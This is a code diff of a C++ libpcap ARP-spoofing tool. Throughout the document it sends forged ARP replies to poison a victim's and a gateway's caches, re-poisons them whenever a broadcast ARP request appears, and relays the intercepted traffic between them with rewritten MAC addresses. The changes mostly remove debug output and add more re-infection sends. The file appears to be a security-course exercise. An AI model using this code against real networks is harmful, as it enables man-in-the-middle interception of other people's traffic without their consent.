@@ -72,7 +72,7 @@ int main(int argc, char *argv[])
     }
     printf("Device is %s\n", argv[1]);
     /* Open the session in promiscuous mode */
-    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
+    handle = pcap_open_live(argv[1], BUFSIZ, 1, 0, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
         return(2);
@@ -80,10 +80,13 @@ int main(int argc, char *argv[])
     // Set infected pkt
     sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
     sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
+    //thread t1(&setInfectedPkt, handle, header);
+    //t1.join();
     setInfectedPkt(handle, header);
 
-    thread t(&receivePkt, handle, header);
-    t.join();
+    // ReceivePkt and Relay pkt in thread
+    thread t2(&receivePkt, handle, header);
+    t2.join();
 
 }
 
@@ -117,34 +120,27 @@ void setInfectedPkt(pcap_t *handle, struct pcap_pkthdr *header)
     const u_char *pkt;
     struct ether_header *eth;
     struct ether_arp *arp;
-    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0 && (checkSenderPkt < 1 || checkTargetPkt < 1 )){
+
+    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0 && (checkSenderPkt < 1 || checkTargetPkt < 1 ) ){
         eth=(struct ether_header *)pkt;
         arp=(struct ether_arp *)(pkt+ETH_HLEN);
         if(memcmp(arp->arp_spa, a2s.arp->arp_tpa, sizeof(in_addr)) ==0 )
         {
-            printf("a2s.eth->ether_dhost : "); for(int i=0; i<6;i++) printf("%02x ", a2s.eth->ether_dhost[i]);printf("\n");
-            printf("arp-> arp_sha : "); for(int i=0; i<6;i++) printf("%02x ", arp->arp_sha[i]);printf("\n");
-            printf("size : %d\n", ETH_ALEN);
             memcpy(a2s.eth->ether_dhost, arp->arp_sha, ETH_ALEN);
             memcpy(a2s.arp->arp_tha, arp->arp_sha, ETH_ALEN);
             a2s.setArpOpcode(ARPOP_REPLY);
             checkSenderPkt++;
             sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
             a2s.printPkt();
-            cout << "sned to infect sender" << endl;
         }
         else if(memcmp(arp->arp_spa, a2t.arp->arp_tpa, sizeof(in_addr)) ==0 )
         {
-            printf("a2t.eth->ether_dhost : "); for(int i=0; i<6;i++) printf("%02x ", a2t.eth->ether_dhost[i]);printf("\n");
-            printf("arp-> arp_sha : "); for(int i=0; i<6;i++) printf("%02x ", arp->arp_sha[i]);printf("\n");
-            printf("size : %d\n", ETH_ALEN);
             memcpy(a2t.eth->ether_dhost, arp->arp_sha, ETH_ALEN);
             memcpy(a2t.arp->arp_tha, arp->arp_sha, ETH_ALEN);
             a2t.setArpOpcode(ARPOP_REPLY);
             checkTargetPkt++;
             sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
             a2t.printPkt();
-            cout << "sned to infect target" << endl;
         }
     }
     cout << "fin infect" << endl;
@@ -159,27 +155,29 @@ void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
     while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
         eth=(struct ether_header *)pkt;
         arp=(struct ether_arp *)(pkt+ETH_HLEN);
-
-        cout << "checking" << endl;
         if(ntohs(eth->ether_type) == ETHERTYPE_ARP) {
             if(memcmp(eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETH_ALEN) == 0) {
                 cout << "need to infect\n";
                 sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
                 sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
-                cout << "Send infect packet" << endl;
+                //cout << "Send infect packet" << endl;
                 continue;
             }
         }
         if(memcmp(a2s.eth->ether_dhost,eth->ether_shost, sizeof(in_addr)) == 0){
+            sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
+            sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
             memcpy(eth->ether_dhost, a2s.eth->ether_dhost, ETH_ALEN);
             memcpy(eth->ether_shost, a2s.eth->ether_shost, ETH_ALEN);
-            cout << "victim's pkt relay to gatyway" << endl;
+            //cout << "victim's pkt relay to gatyway" << endl;
             // sender(victim)'s pkt relay to target(gateway)
         } // check targetIP == received packet's sourceIP(=targetIP)
         else if(memcmp(a2t.eth->ether_dhost,eth->ether_shost, sizeof(in_addr)) == 0){
+            sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
+            sendPkt(handle, a2t.pkt, sizeof(a2t.pkt));
             memcpy(eth->ether_dhost, a2t.eth->ether_dhost, ETH_ALEN);
             memcpy(eth->ether_shost, a2t.eth->ether_shost, ETH_ALEN);
-            cout << "gateway's pkt relay to victim" << endl;
+            //cout << "gateway's pkt relay to victim" << endl;
             // sender(gateway)'s pkt relay to target(victim)
         }
     }
